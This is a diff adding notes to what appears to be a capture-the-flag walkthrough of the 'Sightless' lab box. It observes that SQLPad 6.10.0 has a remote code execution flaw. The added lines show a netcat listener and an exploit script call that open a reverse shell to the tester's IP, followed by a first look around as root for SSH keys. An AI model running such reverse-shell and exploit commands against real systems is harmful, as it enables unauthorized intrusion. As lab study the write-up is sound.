@@ -73,4 +73,15 @@ The version of SQL Pad:  Version: 6.10.0
 
 This has an RCE vuln.
 
+Getting a copy of the RCE is easy. And now I have a foothold.
 
+`nc -nvlp 4000`
+`python3 exploit.py http://sqlpad.sightless.htb:80 10.10.14.73 4000`
+
+# Foothold
+
+So it connects me as root... but I am not seeing anything.
+
+Maybe I need to connect with SSH
+
+Nope, neither root nor michael have a .ssh to copy
